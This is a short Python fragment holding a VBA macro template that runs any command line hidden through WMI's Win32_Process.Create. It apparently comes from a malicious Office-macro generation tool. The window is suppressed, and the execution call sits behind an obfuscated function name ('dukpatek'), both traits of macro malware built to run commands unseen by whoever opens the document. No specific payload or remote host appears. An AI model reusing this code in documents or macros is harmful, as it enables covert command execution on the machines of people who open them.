VBA = \
r"""
' Exec process using WMI
Function WmiExec(cmdLine As String) As Integer
    Dim objConfig As Object
    Dim objProcess As Object
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = 0
    Set objProcess = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
    WmiExec = dukpatek(objProcess, objConfig, cmdLine)
End Function


Private Function dukpatek(myObjP As Object, myObjC As Object, myCmdL As String) As Integer
    Dim procId As Long
    dukpatek = myObjP.Create(myCmdL, Null, myObjC, procId)
End Function

"""